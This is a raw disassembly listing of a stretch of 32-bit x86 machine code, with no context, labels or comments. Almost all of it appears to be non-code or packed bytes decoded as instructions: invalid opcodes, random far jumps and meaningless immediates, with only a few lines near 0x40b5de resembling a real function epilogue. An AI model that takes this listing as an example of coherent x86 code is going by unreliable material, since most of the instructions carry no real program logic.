  40b036:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b037:	dec    ebp
  40b038:	jge    0x40b036
  40b03a:	int    0x2f
  40b03c:	jle    0x40b041
  40b03e:	retf   0xccb4
  40b041:	sti    
  40b042:	stos   DWORD PTR es:[edi],eax
  40b043:	xchg   esi,eax
  40b044:	lods   eax,DWORD PTR ds:[esi]
  40b045:	mov    ds:0xdbefa980,eax
  40b04a:	xchg   ebx,eax
  40b04b:	cli    
  40b04c:	mov    al,BYTE PTR ds:0xc2a2571b
  40b052:	in     eax,dx
  40b053:	out    dx,eax
  40b054:	nop
  40b055:	or     BYTE PTR [bx+si+0x60],0x81
  40b05a:	push   ss
  40b05b:	not    bh
  40b05d:	(bad)  
  40b05e:	xchg   edx,eax
  40b05f:	arpl   WORD PTR [ebx-0x7a],sp
  40b062:	mov    DWORD PTR [eax],esp
  40b064:	jb     0x40b0a4
  40b066:	inc    esi
  40b067:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b068:	add    esi,DWORD PTR [edx+0x77e6403d]
  40b06e:	push   esp
  40b06f:	mov    ch,0xfe
  40b071:	aad    0xa
  40b073:	into   
  40b074:	fucomp st(6)
  40b076:	out    0xdf,al
  40b078:	xchg   ecx,eax
  40b079:	inc    edi
  40b07a:	cmc    
  40b07b:	xchg   ecx,eax
  40b07c:	mov    ebx,0xe8e0c3e3
  40b081:	retf   
  40b082:	push   edx
  40b083:	or     al,0xfd
  40b085:	idiv   DWORD PTR [ebx+0x1d43ad4c]
  40b08b:	adc    cl,BYTE PTR [edx-0x183a0ec8]
  40b091:	fsub   DWORD PTR [ebx]
  40b093:	add    al,0x7
  40b095:	push   ebx
  40b096:	lods   eax,DWORD PTR ds:[esi]
  40b097:	ret    0x9ba9
  40b09a:	ins    BYTE PTR es:[edi],dx
  40b09b:	ins    BYTE PTR es:[edi],dx
  40b09c:	mov    BYTE PTR [eax],bh
  40b09e:	sbb    dl,BYTE PTR [ebx+ebp*1+0x1d]
  40b0a2:	test   eax,0x8974471e
  40b0a7:	inc    eax
  40b0a8:	mov    edi,0x6a0fcb8b
  40b0ad:	rol    DWORD PTR [eax-0x12f871be],1
  40b0b3:	xor    eax,0xa637a41f
  40b0b8:	out    0x2b,eax
  40b0ba:	lods   eax,DWORD PTR cs:[esi]
  40b0bc:	test   ebx,0xf2a78ca1
  40b0c2:	sbb    DWORD PTR [ebp+0x4cf15eaf],0x3d3b8c9a
  40b0cc:	inc    eax
  40b0cd:	cmc    
  40b0ce:	dec    edx
  40b0cf:	sub    cl,BYTE PTR [edi-0x5db5df81]
  40b0d5:	std    
  40b0d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0d7:	add    eax,DWORD PTR [eax+0x1431572a]
  40b0dd:	lahf   
  40b0de:	xlat   BYTE PTR ds:[ebx]
  40b0df:	adc    DWORD PTR ds:0x223e43c7,edi
  40b0e5:	gs test al,0x53
  40b0e8:	shl    BYTE PTR [edi-0x60],1
  40b0eb:	push   edi
  40b0ec:	jmp    0x66871994
  40b0f1:	rcr    BYTE PTR [esi+0x198fa6e],1
  40b0f7:	push   ds
  40b0f8:	jbe    0x40b0a8
  40b0fa:	inc    ebx
  40b0fb:	out    0x10,eax
  40b0fd:	in     al,0x8
  40b0ff:	in     eax,0xc
  40b101:	inc    edx
  40b102:	retf   
  40b103:	dec    ebp
  40b104:	mov    ecx,0xe0b393a5
  40b109:	mov    ds:0xdcfa0db,al
  40b10e:	adc    cl,BYTE PTR [edi]
  40b110:	je     0x40b14e
  40b112:	popa   
  40b113:	jne    0x40b18f
  40b115:	jge    0x40b0c4
  40b117:	push   eax
  40b118:	enter  0x939f,0xab
  40b11c:	dec    edi
  40b11d:	xchg   ebp,eax
  40b11e:	fdivr  DWORD PTR [ecx-0x6f]
  40b121:	cmp    bh,al
  40b123:	push   ebx
  40b124:	das    
  40b125:	push   ss
  40b126:	sub    al,dl
  40b128:	mov    edi,0x8ce88b40
  40b12d:	es stos DWORD PTR es:[edi],eax
  40b12f:	popw   es
  40b131:	jae    0x40b15e
  40b133:	add    dh,BYTE PTR [edi]
  40b135:	and    al,0x36
  40b137:	mov    bh,0xef
  40b139:	sub    eax,0x5572a384
  40b13e:	jmp    0xad18:0xf956b195
  40b145:	call   FWORD PTR [ebx+0x507fee5d]
  40b14b:	gs cmp cl,dh
  40b14e:	sub    al,0xd8
  40b150:	push   esi
  40b151:	and    DWORD PTR [edi+0x2c89cdc],edx
  40b157:	inc    ebx
  40b158:	inc    edx
  40b159:	and    dh,BYTE PTR [eax]
  40b15b:	rcl    DWORD PTR [ebx+0x7e],0xbc
  40b15f:	loopne 0x40b1de
  40b161:	das    
  40b162:	lea    edi,[eax]
  40b164:	push   ss
  40b165:	or     ch,dh
  40b167:	cmp    BYTE PTR [esi-0x26],ah
  40b16a:	in     eax,0xa1
  40b16c:	sbb    edi,edx
  40b16e:	(bad)  
  40b16f:	xchg   edi,eax
  40b170:	imul   ebx,DWORD PTR [ebx],0x14
  40b173:	push   esp
  40b174:	pop    edi
  40b175:	add    eax,esp
  40b177:	xchg   ebp,eax
  40b178:	aas    
  40b179:	(bad)
  40b17d:	repz xor eax,0x73a2811d
  40b183:	shl    DWORD PTR [ebp+0x1b371cd7],0x2a
  40b18a:	mov    edi,0xca82c18c
  40b18f:	fld    QWORD PTR [ebp+0x23e13d8f]
  40b195:	add    eax,0xcccb040d
  40b19a:	push   0xbf9653ac
  40b19f:	in     eax,dx
  40b1a0:	mov    BYTE PTR [edi],cl
  40b1a2:	ja     0x40b189
  40b1a4:	xor    BYTE PTR [edx],0x62
  40b1a7:	jne    0x40b1a1
  40b1a9:	sbb    eax,0x95df17d3
  40b1ae:	cs popf 
  40b1b0:	adc    al,0x8e
  40b1b2:	(bad)  
  40b1b3:	xlat   BYTE PTR ds:[ebx]
  40b1b4:	out    dx,al
  40b1b5:	stos   BYTE PTR es:[edi],al
  40b1b6:	xor    al,0xb6
  40b1b8:	xor    eax,0x234dad6
  40b1bd:	pop    esi
  40b1be:	leave  
  40b1bf:	dec    esi
  40b1c0:	add    al,0x10
  40b1c2:	push   0xe4ec93db
  40b1c7:	in     al,0xcc
  40b1c9:	(bad)  
  40b1ca:	or     bl,BYTE PTR [ebx]
  40b1cc:	(bad)  
  40b1cd:	sbb    eax,0xccfde1ee
  40b1d2:	mov    bh,0xb8
  40b1d4:	and    cl,cl
  40b1d6:	cmp    DWORD PTR [ebx-0x8],esp
  40b1d9:	push   cs
  40b1da:	(bad)  
  40b1db:	mov    edx,0x39af57d9
  40b1e0:	xchg   ecx,eax
  40b1e1:	jp     0x40b1a8
  40b1e3:	xchg   ecx,eax
  40b1e4:	adc    BYTE PTR [ebx],al
  40b1e6:	mov    al,ds:0x1054efb4
  40b1eb:	cmp    DWORD PTR [eax+ebp*1+0x7abc7c0],ebx
  40b1f2:	loopne 0x40b1e7
  40b1f4:	pop    es
  40b1f5:	xor    al,0xbc
  40b1f7:	sub    eax,0xd9796208
  40b1fc:	pop    ebx
  40b1fd:	(bad)  
  40b1ff:	pop    esp
  40b200:	add    ebx,ebp
  40b202:	pop    es
  40b203:	(bad)  
  40b204:	mov    eax,0x1a95d80e
  40b209:	outs   dx,DWORD PTR ds:[esi]
  40b20a:	(bad)  
  40b20b:	xor    al,0xdf
  40b20d:	les    ebx,FWORD PTR [esi+0x6a]
  40b210:	std    
  40b211:	(bad)
  40b215:	loopne 0x40b282
  40b217:	das    
  40b218:	jno    0x40b228
  40b21a:	cmp    BYTE PTR [eax+ebp*8+0x39],bh
  40b21e:	cwde   
  40b21f:	push   ebx
  40b220:	pusha  
  40b221:	push   0xffffffac
  40b223:	cdq    
  40b224:	sub    edx,DWORD PTR [ebx+0x10]
  40b227:	adc    al,0xc0
  40b229:	popa   
  40b22a:	loope  0x40b2a8
  40b22c:	clc    
  40b22d:	aas    
  40b22e:	sbb    DWORD PTR [esi+0x66],esi
  40b231:	pushf  
  40b232:	outs   dx,DWORD PTR ds:[esi]
  40b233:	rcl    ah,0xf1
  40b236:	jns    0x40b1f8
  40b238:	pop    ecx
  40b239:	pushf  
  40b23a:	jae    0x40b267
  40b23c:	cmp    bl,ah
  40b23e:	mov    ds:0xfe4e6dbe,al
  40b243:	test   DWORD PTR [eax-0x653a31aa],eax
  40b249:	pop    esi
  40b24a:	xchg   ebx,eax
  40b24b:	jo     0x40b229
  40b24d:	mov    dh,0xfa
  40b24f:	iret   
  40b250:	jmp    0x79d5ae89
  40b255:	push   ds
  40b256:	out    0xe0,al
  40b258:	xor    dh,BYTE PTR [eax+edx*1+0x34827151]
  40b25f:	sub    BYTE PTR ds:0x1d7e0379,0xb9
  40b266:	ror    eax,cl
  40b268:	xor    ebx,DWORD PTR [esi]
  40b26a:	dec    ebp
  40b26b:	(bad)  
  40b26d:	into   
  40b26e:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  40b270:	enter  0xdc33,0x14
  40b274:	out    0xf9,al
  40b276:	gs nop
  40b278:	fldcw  WORD PTR [ecx+0x4]
  40b27b:	addr16 jge 0x40b23a
  40b27e:	js     0x40b279
  40b280:	idiv   BYTE PTR [edi-0x2dc521a4]
  40b286:	idiv   DWORD PTR [eax]
  40b288:	sti    
  40b289:	cli    
  40b28a:	mov    al,0x3a
  40b28c:	push   ds
  40b28d:	xor    edi,DWORD PTR [edi]
  40b28f:	mov    edi,0x3d16cf2d
  40b294:	fnstenv [edi-0x301d01d8]
  40b29a:	pop    ds
  40b29b:	push   ds
  40b29c:	dec    ecx
  40b29d:	mov    ecx,esi
  40b29f:	xor    bh,BYTE PTR [eax-0x79c7edaa]
  40b2a5:	dec    edi
  40b2a6:	imul   ebp,esi,0xb1b23a92
  40b2ac:	sub    ecx,esp
  40b2ae:	jmp    0xeee5:0x421b56cc
  40b2b5:	jecxz  0x40b320
  40b2b7:	jg     0x40b2f5
  40b2b9:	mov    bh,BYTE PTR ds:0x82927a76
  40b2bf:	jmp    0x40b5d8
  40b2c4:	rol    al,cl
  40b2c6:	(bad)  
  40b2c7:	leave  
  40b2c8:	fcmove st,st(1)
  40b2ca:	rcl    edi,1
  40b2cc:	pop    ss
  40b2cd:	mov    ecx,0x297eb132
  40b2d2:	adc    dl,cl
  40b2d4:	into   
  40b2d5:	mov    bh,BYTE PTR [eax+0x78]
  40b2d8:	je     0x40b358
  40b2da:	js     0x40b354
  40b2dc:	dec    esp
  40b2dd:	in     al,0xfa
  40b2df:	and    bh,BYTE PTR [edi]
  40b2e1:	lahf   
  40b2e2:	xchg   DWORD PTR [edi+0x4e1fbedb],esp
  40b2e8:	repz add edi,esi
  40b2eb:	push   ecx
  40b2ec:	mov    bl,0x9
  40b2ee:	xchg   ebp,eax
  40b2ef:	push   edx
  40b2f0:	cmp    eax,0xa1991560
  40b2f5:	aad    0x8f
  40b2f7:	pop    es
  40b2f8:	or     ebx,esi
  40b2fa:	ret    0x12d1
  40b2fd:	pop    ds
  40b2fe:	inc    edx
  40b2ff:	bound  ebp,QWORD PTR [esi]
  40b301:	pop    es
  40b302:	push   edx
  40b303:	pop    eax
  40b304:	les    ebx,FWORD PTR [ebx+0x29]
  40b307:	rcr    al,0x65
  40b30a:	imul   eax,DWORD PTR [ecx+0xd],0xffffffd9
  40b30e:	repnz dec esp
  40b310:	ficomp WORD PTR [eax+ebx*1+0x3f]
  40b314:	sti    
  40b315:	mov    edx,0x3f9f1c1b
  40b31a:	inc    ebp
  40b31b:	leave  
  40b31c:	and    DWORD PTR [edi-0x23],0xa740a72e
  40b323:	jmp    0xe597:0x9f4a5bc9
  40b32a:	fsubp  st(6),st
  40b32c:	inc    esp
  40b32d:	jp     0x40b318
  40b32f:	popf   
  40b330:	and    eax,0x9fbfd305
  40b335:	daa    
  40b336:	inc    edi
  40b337:	mov    esi,0x8320fec
  40b33c:	add    BYTE PTR [ecx-0x6dd9167b],bh
  40b342:	inc    edx
  40b343:	mov    al,0xba
  40b345:	cli    
  40b346:	add    BYTE PTR [ebx+0x796f411d],bh
  40b34c:	xor    BYTE PTR [ebx+0x2ef92383],ch
  40b352:	inc    edx
  40b353:	dec    esi
  40b354:	sub    bl,BYTE PTR [eax]
  40b356:	jmp    0x40b36b
  40b358:	push   0x83de2a73
  40b35d:	sub    DWORD PTR [edi-0x38c392ef],ebx
  40b363:	sbb    edi,ebp
  40b365:	fwait
  40b366:	pop    esi
  40b367:	cmp    DWORD PTR [esi-0x6fc0fdd6],ecx
  40b36d:	outs   dx,DWORD PTR ds:[esi]
  40b36e:	jns    0x40b3a4
  40b370:	idiv   BYTE PTR [eax-0x47]
  40b373:	pusha  
  40b374:	dec    ecx
  40b375:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b376:	mov    ds:0xcc58c493,eax
  40b37b:	dec    edi
  40b37c:	inc    eax
  40b37d:	sbb    BYTE PTR [ebx],ch
  40b37f:	test   BYTE PTR [ebx+esi*4+0x38],0x2c
  40b384:	popa   
  40b385:	pop    ebx
  40b386:	imul   eax,DWORD PTR [ecx+0x64],0x8e528203
  40b38d:	jmp    0xdd27:0x2dfed100
  40b394:	mov    ecx,0xfd2993e4
  40b399:	test   BYTE PTR [ecx+0x14],cl
  40b39c:	and    BYTE PTR [edi-0xf266579],al
  40b3a2:	not    DWORD PTR [edi+0x99df5c0]
  40b3a8:	clc    
  40b3a9:	and    ebx,edi
  40b3ab:	add    BYTE PTR [ebp+0x626f575b],0x2e
  40b3b2:	icebp  
  40b3b3:	add    BYTE PTR [edx-0x74],0x7d
  40b3b7:	mov    WORD PTR [ebp-0x76573cfa],?
  40b3bd:	(bad)  
  40b3be:	out    0x50,eax
  40b3c0:	(bad)  
  40b3c1:	mov    ds:0xc370589e,al
  40b3c6:	mov    dl,0x30
  40b3c8:	xchg   ecx,eax
  40b3c9:	or     DWORD PTR [edx+0x16],0x7d
  40b3cd:	and    al,0x54
  40b3cf:	fisttp WORD PTR [edx+0x3b69b9b4]
  40b3d5:	fisubr DWORD PTR [esp+esi*8-0x3c1c924d]
  40b3dc:	pop    esi
  40b3dd:	push   es
  40b3de:	pop    ss
  40b3df:	sbb    esp,DWORD PTR [edx+0x22]
  40b3e2:	adc    DWORD PTR [edi-0x48ef2f4c],ebp
  40b3e8:	stos   BYTE PTR es:[edi],al
  40b3e9:	imul   esp,edi,0xac242a34
  40b3ef:	outs   dx,DWORD PTR ds:[esi]
  40b3f0:	call   0x54691be7
  40b3f5:	jb     0x40b3e4
  40b3f7:	jecxz  0x40b428
  40b3f9:	jae    0x40b3ae
  40b3fb:	mov    edi,0x3689c535
  40b400:	adc    eax,0xc85bf6a0
  40b405:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b406:	gs loope 0x40b472
  40b409:	js     0x40b3fe
  40b40b:	xor    al,0xc4
  40b40d:	sbb    DWORD PTR [edx-0x6483fa7f],0xd2557a5
  40b417:	outs   dx,DWORD PTR ds:[esi]
  40b418:	or     bl,0x25
  40b41b:	test   al,0xe
  40b41d:	mov    esi,0xbf37b863
  40b422:	(bad)  
  40b423:	enter  0x49d5,0xe1
  40b427:	pop    esp
  40b428:	fsub   QWORD PTR [esi-0x1f]
  40b42b:	frstor [edx-0x9336902]
  40b431:	push   cs
  40b432:	hlt    
  40b433:	and    al,0x9c
  40b435:	dec    esp
  40b436:	cld    
  40b437:	mov    edi,0x39538c45
  40b43c:	popf   
  40b43d:	fisubr DWORD PTR [eax+0x7e2e67a5]
  40b443:	in     eax,dx
  40b444:	dec    edx
  40b445:	add    esp,DWORD PTR [edi+0x598964c9]
  40b44b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b44c:	inc    ebp
  40b44d:	mul    BYTE PTR [esi+0x40]
  40b450:	push   edi
  40b451:	push   esi
  40b452:	pusha  
  40b453:	mov    DWORD PTR ds:0x5750c6ff,edx
  40b459:	jbe    0x40b3e1
  40b45b:	mov    ebp,0x220a6707
  40b460:	cmp    ch,BYTE PTR [edi]
  40b462:	fimul  DWORD PTR [esi-0x67]
  40b465:	loop   0x40b444
  40b467:	lods   al,BYTE PTR ds:[esi]
  40b468:	int    0xd2
  40b46a:	int3   
  40b46b:	or     cl,BYTE PTR [ebx]
  40b46d:	pop    esi
  40b46e:	cmc    
  40b46f:	cs fwait
  40b471:	shl    DWORD PTR [esi+edx*8-0x71],0xc
  40b476:	scas   al,BYTE PTR es:[edi]
  40b477:	rcl    DWORD PTR [edx-0x37],cl
  40b47a:	xchg   edx,eax
  40b47b:	nop
  40b47c:	mov    edi,0x911b1d4c
  40b481:	out    dx,eax
  40b482:	mov    bl,0xe1
  40b484:	mov    ebp,0x7655dd64
  40b489:	scas   al,BYTE PTR es:[edi]
  40b48a:	push   ds
  40b48b:	(bad)  [edi+ecx*8-0x2a7a620e]
  40b492:	es pushf 
  40b494:	(bad)  
  40b495:	cwde   
  40b496:	adc    edx,DWORD PTR [esi]
  40b498:	es js  0x40b44e
  40b49b:	push   ss
  40b49c:	and    eax,0xcb71677f
  40b4a1:	sbb    al,0x42
  40b4a3:	and    bh,dl
  40b4a5:	and    al,0xc
  40b4a7:	xchg   ebx,eax
  40b4a8:	aam    0x45
  40b4aa:	mov    esp,0xffe3389c
  40b4af:	popa   
  40b4b0:	xor    BYTE PTR [eax+0x1ac8b532],cl
  40b4b6:	call   0xa808f710
  40b4bb:	jne    0x40b44a
  40b4bd:	fsubr  QWORD PTR [esi]
  40b4bf:	dec    DWORD PTR ds:0x216be38
  40b4c5:	int    0x53
  40b4c7:	adc    DWORD PTR [edi+edi*2+0xb919fde],0xba022798
  40b4d2:	sbb    eax,0x82f1b7b0
  40b4d7:	outs   dx,BYTE PTR es:[esi]
  40b4d9:	xchg   ecx,eax
  40b4da:	or     al,0x85
  40b4dc:	adc    bh,BYTE PTR [esi]
  40b4de:	mov    cl,0xcc
  40b4e0:	pop    ss
  40b4e1:	bound  ecx,QWORD PTR [ebx-0x4134bda0]
  40b4e7:	and    eax,0x7c45af14
  40b4ec:	shr    DWORD PTR [ebx+0x710e25d4],cl
  40b4f2:	fidiv  WORD PTR ds:0x697b4695
  40b4f8:	loopne 0x40b525
  40b4fa:	mov    BYTE PTR [esi+0x5a2e31da],dh
  40b500:	xor    DWORD PTR [edi+0x55c34bc],ebx
  40b506:	repz inc cl
  40b509:	pop    ecx
  40b50a:	lods   al,BYTE PTR ds:[esi]
  40b50b:	stos   DWORD PTR es:[edi],eax
  40b50c:	pushf  
  40b50d:	pop    ebp
  40b50e:	xchg   DWORD PTR [edi+0xfc73589],ebx
  40b514:	mov    eax,0x3b055bc
  40b519:	into   
  40b51a:	aam    0xc1
  40b51c:	out    0xcd,eax
  40b51e:	and    eax,0xd62f4213
  40b523:	stos   BYTE PTR es:[edi],al
  40b524:	ss xchg ebx,eax
  40b526:	lds    edx,FWORD PTR [ebx-0x172138ca]
  40b52c:	fstp   st(4)
  40b52e:	ror    DWORD PTR [edx],1
  40b530:	mov    edi,0xd824c339
  40b535:	dec    ebx
  40b536:	cs loopne 0x40b528
  40b539:	std    
  40b53a:	outs   dx,DWORD PTR ds:[esi]
  40b53b:	or     al,0xd8
  40b53d:	rcl    BYTE PTR [ebx+0x3bf7ea05],0xee
  40b544:	cmp    al,0xb9
  40b546:	mov    al,ds:0xb520c01d
  40b54b:	xchg   ebx,eax
  40b54c:	mov    dl,0xaa
  40b54e:	cmp    eax,0x2288d9ea
  40b553:	and    BYTE PTR [esp+ebx*1+0x6d516780],ch
  40b55a:	int3   
  40b55b:	out    0xc9,eax
  40b55d:	mov    al,ds:0xf67cf724
  40b562:	add    eax,0xc7af7745
  40b567:	call   0xfa0c:0xea9c4133
  40b56e:	call   0x2146:0x996bebfe
  40b575:	jne    0x40b5de
  40b577:	pop    esp
  40b578:	call   0xfdac:0x9859bfd5
  40b57f:	ret    
  40b580:	and    bl,BYTE PTR [ebx]
  40b582:	adc    edi,edi
  40b584:	mov    ebp,0x91a6cbb7
  40b589:	les    edi,FWORD PTR [eax-0x5bd95449]
  40b58f:	xor    al,0xe9
  40b591:	push   ebx
  40b592:	aam    0xcc
  40b594:	pushf  
  40b595:	js     0x40b5ef
  40b597:	or     dh,0xe
  40b59a:	in     al,0xad
  40b59c:	sbb    DWORD PTR [edx+0x1c],eax
  40b59f:	(bad)
  40b5a2:	scas   al,BYTE PTR es:[edi]
  40b5a3:	leave  
  40b5a4:	cmps   DWORD PTR ss:[esi],DWORD PTR es:[edi]
  40b5a6:	jnp    0x40b577
  40b5a8:	xchg   DWORD PTR [edx+0x2a],esi
  40b5ab:	sbb    ch,ch
  40b5ad:	or     ebp,DWORD PTR [edx]
  40b5af:	sar    esi,1
  40b5b1:	inc    ecx
  40b5b2:	jl     0x40b577
  40b5b4:	mov    eax,0xf2313ebb
  40b5b9:	sub    eax,0x3e1d8450
  40b5be:	cmp    eax,0x89841281
  40b5c3:	inc    eax
  40b5c4:	lods   eax,DWORD PTR ds:[esi]
  40b5c5:	mov    al,ds:0x2a02140a
  40b5ca:	out    0x19,eax
  40b5cc:	push   es
  40b5cd:	aaa    
  40b5ce:	enter  0xfdd9,0x26
  40b5d2:	dec    bx
  40b5d4:	adc    BYTE PTR [ebp+0x32],al
  40b5d7:	push   eax
  40b5d8:	je     0x40b5f5
  40b5de:	mov    eax,DWORD PTR [ebp-0x1c]
  40b5e1:	or     DWORD PTR [eax],0x60751c9d
  40b5e7:	mov    eax,DWORD PTR [ebp-0x8]
  40b5ea:	xor    eax,ecx
  40b5ec:	add    eax,esi
  40b5ee:	pop    edi
  40b5ef:	pop    esi
  40b5f0:	pop    ebx
  40b5f1:	leave  
  40b5f2:	ret    0x4
  40b5f5:	mov    eax,DWORD PTR [ebp-0xc]
  40b5f8:	add    eax,DWORD PTR [ebp-0x18]
  40b5fb:	jmp    0x40b914
  40b600:	leave  
  40b601:	xlat   BYTE PTR ds:[ebx]
  40b602:	ret    
  40b603:	rcl    cl,0xd4
  40b606:	leave  
  40b607:	fldcw  WORD PTR [esi+0x39ccd584]
  40b60d:	aaa    
  40b60e:	jne    0x40b5a6
  40b610:	retf   0x788f
  40b613:	js     0x40b689
  40b615:	jle    0x40b68f
  40b617:	js     0x40b601
  40b619:	das    
  40b61a:	mov    ds:0x4293c116,al
  40b61f:	nop
  40b620:	mov    DWORD PTR [edi+esi*4+0x4e],eax
  40b624:	js     0x40b608
  40b626:	add    eax,0xe39e49f1
  40b62b:	in     eax,dx
  40b62c:	fstp   QWORD PTR [ecx]
  40b62e:	in     eax,0xf5
  40b630:	mov    ch,0xae
  40b632:	cmp    al,0xaa
  40b634:	push   ebx
  40b635:	push   ebp
  40b636:	xor    ebp,DWORD PTR ds:0xc888d5dd
  40b63c:	cld    
  40b63d:	mov    ds:0xba8f03bd,al
  40b642:	mov    BYTE PTR [ecx+0x6bde3291],al
  40b648:	push   0xd5ac90cf
  40b64d:	fimul  DWORD PTR [ecx-0xa549812]
  40b653:	call   0xb5d0:0x579075eb
  40b65a:	in     eax,0xfa
  40b65c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b65d:	inc    ecx
  40b65e:	ja     0x40b698
  40b660:	fadd   DWORD PTR [edi]
  40b662:	push   esp
  40b663:	rol    BYTE PTR [ebp-0x26],1
  40b666:	int    0xe7
  40b668:	les    ebp,FWORD PTR [edi+0x75]
  40b66b:	or     eax,0xe6e62e1
  40b670:	call   0x9621b744
  40b675:	outs   dx,BYTE PTR ds:[esi]
  40b676:	push   edi
  40b677:	adc    edx,DWORD PTR [ebp+ebp*1-0x3d]
  40b67b:	mov    dl,0x82
  40b67d:	mov    ebp,0x897fbfa4
  40b682:	mov    ds:0x15a1410a,eax
  40b687:	dec    esp
  40b688:	and    al,0xb1
  40b68a:	or     eax,0x10475b9b
  40b68f:	pushf  
  40b690:	ret    0x31b4
  40b693:	gs call 0x8a31390c
  40b699:	das    
  40b69a:	sbb    edx,DWORD PTR [ecx-0x20197b20]
  40b6a0:	jne    0x40b6b4
  40b6a2:	popa   
  40b6a3:	mov    WORD PTR ds:[edx+0x34333f46],fs
  40b6aa:	cld    
  40b6ab:	out    dx,al
  40b6ac:	test   DWORD PTR [edi],ebx
  40b6ae:	std    
  40b6af:	adc    ch,BYTE PTR [ebx]
  40b6b1:	adc    ebx,edi
  40b6b3:	cwde   
  40b6b4:	gs fwait
  40b6b6:	lods   eax,DWORD PTR ds:[esi]
  40b6b7:	je     0x40b6f4
  40b6b9:	ss push es
  40b6bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b6bc:	stos   BYTE PTR es:[edi],al
  40b6bd:	and    ebx,DWORD PTR [ebp-0x38]
  40b6c0:	js     0x40b715
  40b6c2:	out    0xe0,al
  40b6c4:	imul   ebx,DWORD PTR [edi+eax*4+0x26],0x249b6dd6
  40b6cc:	mov    dh,ch
  40b6ce:	loope  0x40b69c
  40b6d0:	pop    ebx
  40b6d1:	(bad)  
  40b6d2:	shl    BYTE PTR [edx+edx*8+0x2972c65],1
  40b6d9:	imul   esi,DWORD PTR [eax],0xffffffff
  40b6dc:	mov    ecx,0x4d19ecde
  40b6e1:	arpl   WORD PTR [edi+0x17],ax
  40b6e4:	mov    ebp,0x8f52cc16
  40b6e9:	fsubr  DWORD PTR [edx]
  40b6eb:	push   0xdbcade01
  40b6f0:	fs ret 0x6da0
  40b6f4:	pop    ecx
  40b6f5:	div    BYTE PTR [ebx-0x48]
  40b6f8:	sbb    bl,BYTE PTR [ebp-0xe]
  40b6fb:	inc    edi
  40b6fc:	lods   eax,DWORD PTR ds:[esi]
  40b6fd:	fwait
  40b6fe:	dec    eax
  40b6ff:	sbb    DWORD PTR [ebx-0xf],esp
  40b702:	ret    
  40b703:	(bad)  
  40b705:	cdq    
  40b706:	mov    ds:0xa2a7da68,al
  40b70b:	jmp    0x606bfdca
  40b710:	mov    cs,WORD PTR [ebx-0x27]
  40b713:	push   0x7008a33e
  40b718:	jecxz  0x40b747
  40b71a:	aad    0x8b
  40b71c:	fisttp DWORD PTR [esi]
  40b71e:	add    al,0x15
  40b720:	test   DWORD PTR [ecx-0x37],esp
  40b723:	sbb    DWORD PTR [ecx-0x1a4be515],edi
  40b729:	cmp    al,0xbc
  40b72b:	mov    cl,0x93
  40b72d:	rcr    BYTE PTR [edx+edi*4+0x5a2dcd58],0xaf
  40b735:	loope  0x40b6ed
  40b737:	mov    edx,0x71e608d6
  40b73c:	cmp    ah,ah
  40b73e:	mov    ds:0xa000342c,eax
  40b743:	daa    
  40b744:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b745:	jbe    0x40b6fc
  40b747:	adc    al,0x45
  40b749:	xor    al,BYTE PTR fs:[ecx]
  40b74c:	mov    WORD PTR [esi+ecx*4-0x2f301c19],gs
  40b753:	mov    eax,ds:0xe2f89ddc
  40b758:	mov    ss,WORD PTR [ebx+0x1e927d23]
  40b75e:	jae    0x40b71a
  40b760:	arpl   bx,si
  40b762:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b763:	jmp    0x82b26f33
  40b768:	(bad)  
  40b769:	jmp    0x93410fc5
  40b76e:	xor    DWORD PTR ds:0x44cb9f26,ecx
  40b774:	inc    ebp
  40b775:	inc    esp
  40b776:	das    
  40b777:	outs   dx,DWORD PTR ds:[esi]
  40b778:	in     al,dx
  40b779:	shr    BYTE PTR [edx+0x15b2a17],cl
  40b77f:	daa    
  40b780:	fimul  DWORD PTR [edi-0x4a]
  40b783:	lds    ebx,FWORD PTR [esi+0x75]
  40b786:	sbb    eax,0xe8b49606
  40b78b:	icebp  
  40b78c:	dec    ebx
  40b78d:	jle    0x40b802
  40b78f:	(bad)  
  40b790:	xchg   esp,eax
  40b791:	or     BYTE PTR [ebx+0x5a255cd],cl
  40b797:	sbb    eax,0xffffff9e
  40b79a:	lods   eax,DWORD PTR ds:[esi]
  40b79b:	jae    0x40b7ab
  40b79d:	and    DWORD PTR [bx],edi
  40b7a0:	sub    cl,BYTE PTR [ecx+ecx*2]
  40b7a3:	inc    DWORD PTR [ebp+0x38626924]
  40b7a9:	or     ebp,0x3d
  40b7ac:	sub    dh,BYTE PTR [esi+0x4b]
  40b7af:	in     al,dx
  40b7b0:	psraw  mm7,mm2
  40b7b3:	inc    eax
  40b7b4:	sub    edx,DWORD PTR [esi+0x4c6b94e3]
  40b7ba:	xor    al,ah
  40b7bc:	pop    ebx
  40b7bd:	inc    edx
  40b7be:	xchg   esp,eax
  40b7bf:	mov    ah,0xa7
  40b7c1:	pop    edx
  40b7c2:	(bad)  
  40b7c3:	fwait
  40b7c4:	mov    esi,0x9284bf4
  40b7c9:	sub    ch,BYTE PTR [esi-0x2f6cadbe]
  40b7cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7d0:	daa    
  40b7d1:	add    ch,BYTE PTR [esi-0x27]
  40b7d4:	jp     0x40b797
  40b7d6:	sbb    eax,0x5224358f
  40b7db:	sbb    eax,0xa588849c
  40b7e0:	dec    esi
  40b7e1:	dec    esi
  40b7e2:	inc    eax
  40b7e3:	pop    edx
  40b7e4:	pop    esp
  40b7e5:	arpl   WORD PTR [edi],di
  40b7e7:	mov    eax,0xc191ffd1
  40b7ec:	retf   
  40b7ed:	jne    0x40b7f2
  40b7ef:	inc    eax
  40b7f0:	repnz std 
  40b7f2:	test   al,0x27
  40b7f4:	cmp    al,0x95
  40b7f6:	test   eax,0x5417c274
  40b7fb:	cli    
  40b7fc:	lahf   
  40b7fd:	or     DWORD PTR [ebx+0x4],eax
  40b800:	pop    ebx
  40b801:	jbe    0x40b836
  40b803:	jmp    0x40b7ba
  40b805:	pop    edx
  40b806:	xor    eax,0xa8e18a84
  40b80b:	inc    esi
